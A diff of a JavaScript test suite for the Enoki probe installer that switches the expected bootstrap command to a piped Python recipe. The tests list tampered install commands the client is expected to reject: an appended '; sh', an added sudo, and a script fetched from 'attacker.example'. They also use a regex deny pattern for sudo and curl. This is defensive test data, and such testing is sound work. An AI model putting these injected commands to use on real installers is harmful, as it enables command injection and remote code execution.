@@ -214,30 +214,17 @@ describe("Release E2E business assertions", () => {
       },
       { enrollmentToken: enrollment.enrollmentToken },
     );
-    expect([
-      officialInstallCommand,
-      "ENOKI_HUB_URL='https://hub.example' ENOKI_ENROLLMENT_TOKEN='enk_enroll_secret' /usr/local/bin/enoki-probe-bootstrap-acquire | sudo -- /usr/local/bin/enoki-probe-bootstrap-activate",
-    ]).toContain(rendered.installCommand);
+    expect(rendered.installCommand).toBe(officialInstallCommand);
 
-    const unsafeCommands = rendered.installCommand.includes(
-      "/usr/local/bin/enoki-probe-bootstrap-acquire",
-    )
-      ? [
-          `${rendered.installCommand}; sh`,
-          rendered.installCommand.replace(
-            "/usr/local/bin/enoki-probe-bootstrap-acquire",
-            "/tmp/attacker-acquire",
-          ),
-          rendered.installCommand.replace("sudo --", "sudo sh --"),
-        ]
-      : [
-          `${rendered.installCommand}; sh`,
-          rendered.installCommand.replace("python3 --", "sudo python3 --"),
-          rendered.installCommand.replace(
-            "./enoki-probe-bootstrap.py",
-            "https://attacker.example/bootstrap.py",
-          ),
-        ];
+    const unsafeCommands = [
+      `${rendered.installCommand}; sh`,
+      rendered.installCommand.replace("python3 --", "sudo python3 --"),
+      rendered.installCommand.replace(
+        "./enoki-probe-bootstrap.py",
+        "https://attacker.example/bootstrap.py",
+      ),
+      "ENOKI_HUB_URL='https://hub.example' ENOKI_ENROLLMENT_TOKEN='enk_enroll_secret' /usr/local/bin/enoki-probe-bootstrap-acquire | sudo -- /usr/local/bin/enoki-probe-bootstrap-activate",
+    ];
     for (const installCommand of unsafeCommands) {
       const client = createHubLifecycleClient({
         baseUrl: "https://hub.example",
@@ -276,18 +263,15 @@ describe("Release E2E business assertions", () => {
       },
     );
     expect(rendered.installCommand).toBe(
-      productionBootstrapCommand({
+      `printf '%s\\n' '${JSON.stringify({
         hubOrigin: "https://hub.example",
         enrollmentToken: "enk_enroll_replacement",
         replacementMigration,
         schemaVersion: 1,
-      }),
+      })}' | python3 -- ./enoki-probe-bootstrap.py --hub-origin 'https://hub.example'`,
     );
-    expect(rendered.installCommand).toContain(
-      "/usr/local/bin/enoki-probe-bootstrap-acquire | sudo -- /usr/local/bin/enoki-probe-bootstrap-activate",
-    );
-    expect(rendered.installCommand).not.toContain(
-      "python3 -- ./enoki-probe-bootstrap.py",
+    expect(rendered.installCommand).not.toMatch(
+      /ENOKI_ENROLLMENT_TOKEN|enoki-probe-bootstrap-(?:acquire|activate)|sudo|curl|github/i,
     );
     const enrollment = officialEnrollment({
       enrollmentId: replacementMigration.enrollmentId,
@@ -364,7 +348,7 @@ describe("Release E2E business assertions", () => {
           jsonResponse(
             {
               ...enrollment,
-              installCommand: productionBootstrapCommand(mutated),
+              installCommand: bootstrapRecipeCommand(mutated),
             },
             201,
           ),
@@ -1052,7 +1036,7 @@ describe("Probe Host Harness", () => {
       authority: "enk_enroll_production",
       expectedToken: "enk_enroll_production",
       label: "ordinary Enrollment token",
-      workingDirectory: null,
+      workingDirectory: "/tmp/enoki-release-e2e-recipe.abcdef",
     },
     {
       authority:
@@ -1063,10 +1047,10 @@ describe("Probe Host Harness", () => {
         enrollmentId: "enr_manual_reinstall_0001",
         target: { hostId: 7, kind: "manual_reinstall" },
       },
-      workingDirectory: undefined,
+      workingDirectory: "/tmp/enoki-release-e2e-recipe.abcdef",
     },
   ])(
-    "accepts the exact production Bootstrap command with $label",
+    "executes the exact Candidate recipe command with $label",
     async ({ authority, expectedToken, overrides = {}, workingDirectory }) => {
       const parsedAuthority = authority.startsWith("{")
         ? JSON.parse(authority)
@@ -1091,7 +1075,7 @@ describe("Probe Host Harness", () => {
         prepareInstall: async ({ installContract }) => {
           preparedContracts.push(installContract);
           return {
-            evidence: { kind: "candidate-bootstrap-binaries" },
+            evidence: { kind: "candidate-bootstrap-recipe" },
             workingDirectory,
           };
         },
@@ -1099,21 +1083,21 @@ describe("Probe Host Harness", () => {
       const enrollment = {
         ...officialEnrollment({
           enrollmentToken: expectedToken,
-          installCommand: `ENOKI_HUB_URL='https://hub.example' ENOKI_ENROLLMENT_TOKEN='${authority}' /usr/local/bin/enoki-probe-bootstrap-acquire | sudo -- /usr/local/bin/enoki-probe-bootstrap-activate`,
+          installCommand: bootstrapRecipeCommand(authority),
           ...overrides,
         }),
       };
 
-      await harness.assertDisposable("run-production-bootstrap");
+      await harness.assertDisposable("run-bootstrap-recipe");
       await expect(
-        harness.install(enrollment, "run-production-bootstrap"),
+        harness.install(enrollment, "run-bootstrap-recipe"),
       ).resolves.toMatchObject({
-        bootstrapRecipeProvenance: { kind: "candidate-bootstrap-binaries" },
+        bootstrapRecipeProvenance: { kind: "candidate-bootstrap-recipe" },
       });
       expect(preparedContracts).toEqual([
         {
           hubUrl: "https://hub.example",
-          kind: "production-bootstrap",
+          kind: "bootstrap-recipe",
           ...(parsedAuthority
             ? {
                 replacementMigration: parsedAuthority.replacementMigration,
@@ -1126,7 +1110,10 @@ describe("Probe Host Harness", () => {
         command.includes("# enoki-release-e2e:bootstrap-acquire"),
       );
       expect(install).toContain(enrollment.installCommand);
-      expect(install).not.toContain("\ncd -- ");
+      expect(install).toContain("cd -- '/tmp/enoki-release-e2e-recipe.abcdef'");
+      expect(install).not.toMatch(
+        /ENOKI_ENROLLMENT_TOKEN|enoki-probe-bootstrap-(?:acquire|activate)|sudo|curl|github/i,
+      );
     },
   );
 
@@ -2291,7 +2278,7 @@ describe("Probe Host Harness", () => {
         }
         if (
           command.includes(
-            "ENOKI_ENROLLMENT_TOKEN='enk_enroll_repeat' /usr/local/bin/enoki-probe-bootstrap-acquire",
+            "printf '%s\\n' 'enk_enroll_repeat' | python3 -- ./enoki-probe-bootstrap.py",
           )
         ) {
           return {
@@ -2306,8 +2293,7 @@ describe("Probe Host Harness", () => {
     });
     const repeatedEnrollment = officialEnrollment({
       enrollmentToken: "enk_enroll_repeat",
-      installCommand:
-        "ENOKI_HUB_URL='https://hub.example' ENOKI_ENROLLMENT_TOKEN='enk_enroll_repeat' /usr/local/bin/enoki-probe-bootstrap-acquire | sudo -- /usr/local/bin/enoki-probe-bootstrap-activate",
+      installCommand: bootstrapRecipeCommand("enk_enroll_repeat"),
     });
 
     await harness.assertDisposable("run-repeat-add");
@@ -3183,7 +3169,7 @@ describe("Hub Lifecycle Client", () => {
       targetHostId: "7",
       targetProbeVersion: "1.2.3",
     };
-    const installCommand = productionBootstrapCommand({
+    const installCommand = bootstrapRecipeCommand({
       hubOrigin: "https://hub.example",
       enrollmentToken: "enk_enroll_secret",
       replacementMigration,
@@ -8604,8 +8590,10 @@ function productInstallerOutput() {
 const officialInstallCommand =
   "printf '%s\\n' 'enk_enroll_secret' | python3 -- ./enoki-probe-bootstrap.py --hub-origin 'https://hub.example'";
 
-function productionBootstrapCommand(authority) {
-  return `ENOKI_HUB_URL='https://hub.example' ENOKI_ENROLLMENT_TOKEN='${JSON.stringify(authority)}' /usr/local/bin/enoki-probe-bootstrap-acquire | sudo -- /usr/local/bin/enoki-probe-bootstrap-activate`;
+function bootstrapRecipeCommand(authority) {
+  const enrollment =
+    typeof authority === "string" ? authority : JSON.stringify(authority);
+  return `printf '%s\\n' '${enrollment}' | python3 -- ./enoki-probe-bootstrap.py --hub-origin 'https://hub.example'`;
 }
 
 function officialEnrollment(overrides = {}) {
